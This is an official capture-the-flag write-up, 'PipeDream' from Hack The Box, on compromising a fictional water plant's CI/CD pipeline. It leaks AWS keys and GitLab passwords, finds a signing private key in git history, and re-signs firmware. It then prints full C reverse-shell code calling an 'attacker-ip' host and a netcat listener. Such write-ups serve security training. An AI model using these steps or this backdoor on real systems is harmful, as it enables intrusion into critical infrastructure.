![banner](../../assets/banner.png)

<img src="../../assets/htb.png" style="zoom: 80%;" align=left /><font size="5">PipeDream</font>

​	24<sup>th</sup> April 2025

​	Prepared By: MrR3boot

​	Challenge Author(s): MrR3boot

​	Difficulty: <font color=red>Hard</font>

​	Classification: Official







# Synopsis 

PipeDream is a hard cloud challenge that highlights common mistakes in the DevOps lifecycle. The challenge begins with a set of AWS credentials leaked in a `.env.production` file exposed by the water plant application. These credentials grant access to the `DynamoDB` service, which stores further credentials for a self-hosted `GitLab` instance. Inside the GitLab, a firmware repository for the water plant is accessible. By examining Git commit history, players uncover an additional set of credentials along with a private RSA key. The repository also includes `CodeBuild` build specifications and details about the firmware signing mechanism. Players can manipulate the firmware source code, sign it using the leaked key, and trigger a build using the AWS credentials ultimately resulting in a backdoored firmware being deployed to the plant server. This challenge demonstrates the risks of hardcoded secrets, weak access controls, and poor key management in CI/CD environments.

# Description

In the depths of Volnaya’s covert operations, their operatives have silently infiltrated the critical infrastructure of rival nations. The Empire has targeted a water plant to serve as a gateway for spreading their control across other ICS networks. Your mission is to infiltrate, corrupt, and destabilize the plant's operations, spreading the infection to other vital systems. Disrupt Volnaya’s plans before the world plunges into chaos.

`IP: 18.189.24.231`

## Skills required 

* Knowledge of Web Applications
* Familiarity with Cloud Technologies (AWS)
* Understanding of CI/CD Processes
* Basic Git & Version Control Skills
* Awareness of Digital Signatures & Key Management

## Skills Learned

-  Exploiting leaked credentials
-  Navigating AWS services
-  Analyzing Git commits
-  Abusing CI/CD pipelines
-  Bypassing firmware signing checks

# Challenge

We've given the IP address. Let's do a quick port scan to identify open ports and services. 

```bash
rustscan -a 18.189.24.231

Open 18.189.24.231:22
Open 18.189.24.231:443
Open 18.189.24.231:5173
Open 18.189.24.231:8060
Open 18.189.24.231:9094
Open 18.189.24.231:43211
```

We find multiple ports. Let's run version scan using nmap.

```bash
PORT      STATE SERVICE  VERSION                                                                             22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)                       | ssh-hostkey:                                                                                               |   256 03:18:7f:18:28:f0:42:6e:00:7a:12:0b:14:ac:12:88 (ECDSA)                                               |_  256 d5:aa:f2:b6:fc:52:29:3c:d6:62:88:c5:ff:37:0c:3e (ED25519)                                             443/tcp   open  ssl/http nginx                                                                               |_ssl-date: TLS randomness does not represent time                                                           |_http-trane-info: Problem with XML parsing of /evox/about                                                   | http-robots.txt: 86 disallowed entries (15 shown)                                                           | / /autocomplete/users /autocomplete/projects /search                                                       | /admin /profile /dashboard /users /api/v* /help /s/ /-/profile                                             |_/-/profile/ /-/user_settings/ /-/ide/                                                                       | http-title: Sign in \xC2\xB7 GitLab                                                                         |_Requested resource was https://gitlab.local/users/sign_in                                                   | ssl-cert: Subject: commonName=gitlab.local                                                                 | Subject Alternative Name: DNS:gitlab.local                                                                 | Not valid before: 2025-04-17T13:26:29                                                                       |_Not valid after:  2026-04-17T13:26:29                                                                       5173/tcp  open  unknown
8060/tcp  open  http     nginx 1.27.4
|_http-server-header: nginx/1.27.4
|_http-title: 404 Not Found
9094/tcp  open  unknown
43211/tcp open  http     Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

We've `GitLab` instance running on port 443. Let's browse to it.

![gitlab](assets/gitlab.png)

Registration is disabled and we don't have any credentials to login. Let's move on to 5173 port. 

![plant](assets/plant.png)

We've a `Volnaya Waterplant` application. It has `Firmware Update` and settings page for water plant but both seemed to be static. Checking page source we find this application is built with [Vite](https://vite.dev/guide/) build tool. We also find this information by fuzzing the application. 

```bash
ffuf -u http://18.189.24.231:5173/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .json -fw 77

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://18.189.24.231:5173/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .json 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 77
________________________________________________

package.json            [Status: 200, Size: 809, Words: 136, Lines: 33, Duration: 253ms]
package                 [Status: 200, Size: 920, Words: 58, Lines: 40, Duration: 264ms]
```

There is `/package.json` file present. 

```bash
curl http://18.189.24.231:5173/package.json -s | jq .
{
  "name": "vite-react-typescript-starter",
  "private": true,
  "version": "0.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "lint": "eslint .",
    "preview": "vite preview"
  },
  ...
}
```

Reading more about the Vite build tools [documentation](https://vite.dev/guide/env-and-mode) we learn how it manages env variables. 

![image-20250424103057503](assets/env.png)

It priorities `.env.production` in general. Let's try if we can access `.env` or `.env.production` or `.env.local` files. 

```bash
curl http://18.189.24.231:5173/.env.production -s 

# Tank System Configuration
VITE_TANK_INTERVAL=100
VITE_TANK_MAX_LEVEL=100
VITE_TANK_MIN_LEVEL=0
VITE_TANK1_START_LEVEL=0
VITE_TANK2_START_LEVEL=0
VITE_VALVE0_OPEN=true
VITE_VALVE1_OPEN=false
VITE_VALVE2_OPEN=false

# AWS Credentials - Use ONLY for local dev or if you're accessing via a proxy API
VITE_AWS_ACCESS_KEY_ID=AKIARHJJMXKMS7Y56N2X
VITE_AWS_SECRET_ACCESS_KEY=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
VITE_AWS_REGION=us-east-2
VITE_DYNAMODB_TABLE_NAME=tanklevels
```

We find AWS credentials and DynamoDB table name from this file. Let's configure keys and list dynamodb tables. 

```bash
aws configure
AWS Access Key ID [None]: AKIARHJJMXKMS7Y56N2X
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-2
Default output format [None]: 
```

```bash
aws sts get-caller-identity
{
    "UserId": "AIDARHJJMXKMYDS725IT7",
    "Account": "084375550617",
    "Arn": "arn:aws:iam::084375550617:user/opcache"
}
```

```bash
aws dynamodb list-tables
{
    "TableNames": [
        "ciusers",
        "tanklevels"
    ]
}
```

There is additional table called `ciusers`. Let's view contents of each table. 

**tanklevels**

```bash
aws dynamodb scan --table-name tanklevels
{
    "Items": [
        {
            "Level": {
                "N": "30"
            },
            "TankId": {
                "S": "tank1"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}
```

**ciusers**

```bash
aws dynamodb scan --table-name ciusers
{
    "Items": [
        {
            "password": {
                "S": "Wuj!)e9Ex']s}Xt"
            },
            "username": {
                "S": "siberion"
            }
        },
        {
            "password": {
                "S": "s~_>42ucT9pm"
            },
            "username": {
                "S": "nightpulse"
            }
        },
        {
            "password": {
                "S": "]Z4gw8!3@dbP"
            },
            "username": {
                "S": "coldrunner"
            }
        },
        {
            "password": {
                "S": "0Vpkj)10)U\\6"
            },
            "username": {
                "S": "sara"
            }
        },
        {
            "password": {
                "S": "t61`L7Lt4^p|"
            },
            "username": {
                "S": "zarya"
            }
        }
    ],
    "Count": 5,
    "ScannedCount": 5,
    "ConsumedCapacity": null
}
```

We've multiple usernames and passwords. `Siberion` credentials seems to work on GitLab instance. Let's login and explore repositories. Also add `gitlab.local` host entry for the ip as the repository seems to redirect us to this domain name. 

```bash
echo '18.189.24.231 gitlab.local' | sudo tee -a /etc/hosts
```

![repo](assets/repo.png)

There are `33` commits in the repository. We can run a tool like [trufflehog](https://github.com/trufflesecurity/trufflehog) to scan the repository for potential keys or credentials. 

```bash
trufflehog git file://volnaya-waterplant-firmware --no-update

🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

Found unverified result 🐷🔑❓
Detector Type: Gitlab
Decoder Type: PLAIN
Raw result: -waterplant-firmware
Rotation_guide: https://howtorotate.com/docs/tutorials/gitlab/
Version: 1
Commit: 534c0becb2220442d2d9a2a0788ba1352a59b6b0
Email: root <root@volnaya.htb>
File: buildspec.yml
Line: 18
Repository: https://18.189.24.231/root/volnaya-waterplant-firmware.git
Timestamp: 2025-04-23 11:39:22 +0000

✅ Found verified result 🐷🔑
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIARHJJMXKMTQ2ZUJVO
User_id: AIDARHJJMXKM3YRREY6GX
Arn: arn:aws:iam::084375550617:user/ci-dev
Rotation_guide: https://howtorotate.com/docs/tutorials/aws/
Resource_type: Access key
Account: 084375550617
Commit: fd21cc16ea6773c506fe7da5bd9d87e2c32399be
Email: root <root@volnaya.htb>
File: README.md
Line: 43
Repository: https://18.189.24.231/root/volnaya-waterplant-firmware.git
Timestamp: 2025-04-17 12:42:21 +0000

Found unverified result 🐷🔑❓
Detector Type: PrivateKey
Decoder Type: PLAIN
Raw result: -----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCA2sbHMhHrcAMP
xF4BLcf9SWYKiUBy4gBeRHiK0/PXVofEqrLQEvIvEzi1ItiRYIu6qu729LU3MAgW
HhMySqtWibiSsCn3OgCYWmqyLXP1vmmps+DNJPqTMevbsPXC/JCfZYXqpdGlbTYo
+eIbzmIpMp/1a+oo9vdT2hvTgH/yDA3WsUqjI+f6Tq1Ns4dpPpGquRLg0Vw9MQmz
269lABOEra812EbhoCDmOxpfoK6iosbKO0z9YXo7/lXirpLA7h+NV+IeKi1uSsot
KvVDCwltN2ghRZ6sZ0Rf0nTFuq2o0iLRGMQbO1LttFA48mD18lUWmTWyFHYtkf+c
aUXvkhsRAgMBAAECggEADXIGtOliGk2dXCtS3c+foyviBG5u9a3kePGvHFlig9FJ
KHnhX7niYIwiajBBJeZLnkZQ2h8Nu7z80wX/XcuR1l1Xj6LnNh9syXkB0ibRB07/
qpAVAIL/zJU0db+g3WBKXP+UejgkSJ09PghZEiq2bnMUYuEIVY7znuHO7oJll2WJ
ssZwIDb4Oa7MmO0LnFMDtup1I1yJQ245SPkO4jf3IlxjZyymwSHmMFBbrDpjFD0a
l3aLSgJHNQiGBhRRMpw8zpcx9B3uox70iWtqsykVHCmA1mfiDxdMB6B3iNpfqUhV
d+l02nPlY7myx7fAtrVpjVjiSHP3Ey0q/vOPSyBDWQKBgQC2DJVf7d+maZ/bCFlq
3A2FDUB259gZ6hxn+mrGflHR2CNMTuU3C0uzvSEUoZWT4JWt1/RP6q6wHyqg5Te7
vaHAarAR1HE55c93vWEkvobTFSYnlsBn2JRQb3oJlZUNSTUJ5smJWIKyBy+hcTI+
JefKYdqRQn8p5chsKR6Qy8OJPQKBgQC1MnROCVLW3pDTSrzAbbkDG/U6jfCuiC7K
ckhkQhWLpvsJlGJguU/UHis5b+BqwIwCQhpDTKBwLos7AQH+mm0hZID5GWqvBl9e
7QxGrb2b4KnzL1H3gcWL7aGniktN6rQ5C0rqIPk1wbKT9g54tX62QIegZiPn7iie
BXSDcBQuZQKBgQCpW3t7CqgNACYedd35c02AgZt/AqAfO5PBh0zd65XiSdhMnPjQ
BEogo8mqj8e/Eics2sIFtqVcYyIdHCCFHxzjDF1PuPq8ifY/xoYg0L5MkFg2bCAC
e5E+YvZ9BBLtkTUuSO0kQJsVU2oUHmJHPqwrsmzKxbnXGFUjif1NZsI5YQKBgEAw
xJUUpn0qUaIYuu9sr3tTfzekKxyZcAIWJGEoLBvSJuLI52UeoRIjMeriIF2RIsh2
BHnM/pVfV8GqZLt+l6SZxzr37xxcJJMrZQrw59f96hcVr3MATSx6HaeNzYmn2PrQ
blStI7wQh6P1KkFHAsGr8KA5LwUuEMOSaSlbHjslAoGAVlS7XPmj6zVyJXDNq/0J
UaMNb+GGiQ83R+wgKAhOSTUI8WjhmKJNlwSkjFwTOq90xdPslO2aS3whdkPUL96L
2X8NZfqLQZssZC90pzeivg0fH8jy5DeC+GX3xoXoWFujwqxN7snCcVBmP9RH0Vei
p3DJPDhDYHjpNDdW1Pieu4Q=
-----END PRIVATE KEY-----
Commit: aff5a0a10fbafc1bdbf510dacc47f7d499bbc998
Email: root <root@volnaya.htb>
File: debug.h
Line: 1
Repository: https://18.189.24.231/root/volnaya-waterplant-firmware.git
Timestamp: 2025-04-22 09:57:16 +0000
```

Scan identified a private key and set of AWS credentials. 

```bash
git show fd21cc16ea6773c506fe7da5bd9d87e2c32399be
...
+```env
+AWS_ACCESS_KEY_ID=AKIARHJJMXKMTQ2ZUJVO
+AWS_SECRET_ACCESS_KEY=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
+AWS_REGION=us-east-2
```

We can use tools like [enumerate-iam](https://github.com/andresriancho/enumerate-iam) to identify permissions that these credentials has access to. 

```bash
./enumerate-iam.py --access-key AKIARHJJMXKMTQ2ZUJVO --secret-key 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 --region us-east-2
2025-04-25 01:24:23,442 - 2299250 - [INFO] Starting permission enumeration for access-key-id "AKIARHJJMXKMTQ2ZUJVO"
2025-04-25 01:24:25,612 - 2299250 - [INFO] -- Account ARN : arn:aws:iam::084375550617:user/ci-dev
2025-04-25 01:24:25,613 - 2299250 - [INFO] -- Account Id  : 084375550617
2025-04-25 01:24:25,613 - 2299250 - [INFO] -- Account Path: user/ci-dev
2025-04-25 01:24:26,260 - 2299250 - [INFO] Attempting common-service describe / list brute force.
2025-04-25 01:24:26,394 - 2299250 - [WARNING] Client is configured with the deprecated endpoint: us-east-2
2025-04-25 01:24:39,253 - 2299250 - [INFO] -- dynamodb.describe_endpoints() worked!
2025-04-25 01:24:42,432 - 2299250 - [ERROR] Remove codedeploy.batch_get_deployment_targets action
2025-04-25 01:24:42,433 - 2299250 - [ERROR] Remove codedeploy.get_deployment_target action
2025-04-25 01:24:44,442 - 2299250 - [ERROR] Remove codedeploy.list_deployment_targets action
2025-04-25 01:24:46,246 - 2299250 - [INFO] -- codebuild.list_projects() worked!
...
```

Looks like we've `CodeBuild` list projects permission.

```bash
aws codebuild list-projects
{
    "projects": [
        "volnaya-firmware-build"
    ]
}
```

There is a project to build the firmware. Looking at `buildspec.yml` we find how the firmware code is deployed to the device. 

```yaml
version: 0.2

env:
  variables:
    GITLAB_USER: "root"
    GITLAB_TOKEN: "glpat-*****"
    GITLAB_HOST: "******"
  secrets-manager:
    DEPLOY_KEY: "volnaya/deploy-key:GITLAB_SSH_KEY"
    DEBUG_KEY: "volnaya/debug-key:PUBLIC_KEY"
    
phases:
  pre_build:
    commands:
      - echo "Setting up Git credentials"
      - git config --global credential.helper store
      - echo "https://${GITLAB_USER}:${GITLAB_TOKEN}@${GITLAB_HOST}" > ~/.git-credentials
      - git -c http.sslVerify=false clone https://${GITLAB_HOST}/root/volnaya-waterplant-firmware.git firmware
      - echo "Verifying Signature"
      - cd firmware
      - FIRMWARE_META="firmware_meta.json"
      - SIGNATURE_B64=$(jq -r .signature "$FIRMWARE_META")
      - echo "$SIGNATURE_B64" | base64 -d > /tmp/signature.sig
      - SIGNATURE_FILE="/tmp/signature.sig"
      - CLEAN_META="/tmp/firmware_meta_clean.json"
      - jq 'del(.signature)' "$FIRMWARE_META" > "$CLEAN_META"
      - echo "$DEBUG_KEY" > /tmp/public_key.pem
      - openssl dgst -sha256 -verify /tmp/public_key.pem -signature "$SIGNATURE_FILE" "$CLEAN_META" && echo "Signature verification passed." || { echo "Signature verification failed. Exiting."; exit 1; }
      - ACTUAL_HASH=$(sha256sum main.c | awk '{print $1}')
      - EXPECTED_HASH=$(jq -r .firmware_hash "$FIRMWARE_META")
      - "$ACTUAL_HASH" == "$EXPECTED_HASH" && echo "Source hash matches signed firmware." || { echo "Hash comparision failed. Exiting."; exit 1; }
  build:
    commands:
      - echo "Building Firmware"
      - make
      - mkdir -p ~/.ssh
      - echo "$DEPLOY_KEY" > ~/.ssh/id_rsa
      - chmod 600 ~/.ssh/id_rsa
      - ssh-keyscan -H ${GITLAB_HOST} >> ~/.ssh/known_hosts
      - scp firmware.elf root@${GITLAB_HOST}:/root/firmware/firmware.elf
```

The repository has `firmware_meta.json` file which contains `signature` that is base64 encoded. 

```bash
{
  "timestamp": "2025-04-22T10:44:52Z",
  "firmware_hash": "fbe11c0cd350afe4829eb21adf38fd95b062a7aa3a82062a5ddc32732d136fa7",
  "signature": "cjNuS9rUzspcXhecgrWlH4geRBD/znsdgX8xRPZXevX0kHFZhr/sZWCmQHL+RBoCHQivKlbcY+nhWw0ygDLagLpiQRNSztkFNbtQSpCwsipdm+4LYg7aDmUQ+Fxv3Vlx4kgvihzi/bQfunuuJ8nQ6PWmBrGLxvA+Uly1RR+NPGN+8PlT2Rxw2Lpd6JuzDD5YLHiQGnf31W3eP2ugyocke4pGKCfc7ppVsbqjuy7XIxZ9iezDDFwR7i+Jupz1FvuQVsxeaYNfRBpDA8aGOeJkDQN8iYjV3Hkyv89Ye4G9EXefxV+ybwYeaggaIPox+lxk4jXuk5M1/E7QZc5YcAa2kg=="
}
```

It removes the signature from the file and checks against `firmware_meta.json` to see if signature is valid. Then it calculates SHA256 hash for the `main.c` file then compares it with `firmware_hash` in the metadata file. If both the checks passed then it builds and copies the firmware to the device. 

We have identified a private key from commits. It can be used to create signature after modifying the `main.c` file. Let's change the contents of `main.c` to reverse shell file. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char *ip = "attacker-ip";
    int port = 4444;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        exit(1);
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execl("/bin/sh", "sh", NULL);

    return 0;
}
```

Generate sha256sum and update it on `firmware_meta.json`. Remove signature as well.

```json
{
  "timestamp": "2025-04-22T10:44:52Z",
  "firmware_hash": "21a730fb69d32a3e68bbcd920c7cfc893692ade3367788b77257bced3c3cd282"
}

```

Now let's calculate signatue using openssl tool.

```bash
openssl dgst -sha256 -sign debug.pem -out signature.bin firmware_meta.json
base64 -w0 signature.sig
```

Create an entry for the signature in the `firmware_meta.json`. 

```json
{
  "timestamp": "2025-04-22T10:44:52Z",
  "firmware_hash": "21a730fb69d32a3e68bbcd920c7cfc893692ade3367788b77257bced3c3cd282",
  "signature": "QHIgLBszQWkdwUl58tiMj4WKkrK0S5M2dFJ0goWkT7p2uWSBwhmfc8s83kDB7hw7tASbAgb8vpkwrxo8f7zscybW01gAREJ7GHB49fXDsSMcA9WjoGfHqfXqQSuo2g3Dl0fHSA0mMibno1lskUfPHkgMGp1OuQsKu4yki6cmnIg0SGXtrCL65HUygwnkf6jyoftFen4wH+76D5wzLqAKkgmzRcNdY/+gNMEE9Sj9N3gsIEDSZ83VcevGK8Cva5c83Wcljgr/tQQuDFRtizmko3LA+1nQMukRexxSBduLkh2UDMe/hcCvxPFXIwBdUCBPSpb/oiKKW7+nsedRcMPJog=="
}

```

Create a merge request for these changes and start the build.

```bash
aws codebuild start-build --project-name volnaya-firmware-build                                                                     
{                                                                                                                                         
    "build": {                                                                                                                            
        "id": "volnaya-firmware-build:d006b7e6-7ca6-4a5e-a940-1f24052bf9a0",
        "arn": "arn:aws:codebuild:us-east-2:084375550617:build/volnaya-firmware-build:d006b7e6-7ca6-4a5e-a940-1f24052bf9a0",
        "buildNumber": 43,
...
```

We receive a shell and can find the flag from `/flag.txt`. 

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 18.189.24.231 43712
id
uid=0(root) gid=0(root) groups=0(root)
```

